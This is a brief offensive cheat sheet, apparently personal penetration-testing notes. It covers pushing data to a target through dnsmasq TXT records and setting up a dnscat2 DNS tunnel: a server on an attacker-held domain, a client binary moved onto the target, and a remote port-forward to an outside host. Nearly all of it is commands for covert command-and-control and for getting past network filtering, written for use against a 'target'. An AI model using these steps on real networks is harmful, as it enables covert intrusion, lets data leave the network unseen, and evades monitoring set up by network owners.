## Manual DNS TXT Record Infiltration with dnsmasq:
1. Edit 'dnsmasq_txt.conf' on controlled dnsmasq server. Example:
```
# TXT record
txt-record=www.feline.corp,here's something useful!
txt-record=www.feline.corp,here's something else less useful.
```
2. Start dnsmaq:
```
sudo dnsmasq -C dnsmasq_txt.conf -d
```
3. Check that DNS requests are properly routed on target:
```
resolvectl status
```
4. Run a TXT resolution from the target to the server:
```
nslookup -type=txt www.feline.corp
```

## DNS Tunneling with dnscat2:
1. Start dnscat2-server on your authorative DNS server:
```
dnscat2-server <domain>
```
2. Transfer the dnscat binary to the target from: https://github.com/iagox86/dnscat2
3. Start the clients and connect them:
```
./dnscat --secret=<secret> <domain>
```
4. Enter your initiated window from the server:
```
#List active windows:
windows

#Enter the window:
window -i 1
```
5. Set up remote port forwarding tunnel:
```
listen 0.0.0.0:2345 <outip>:<outport>
```
6. Use tunnel with server port and ip = win!
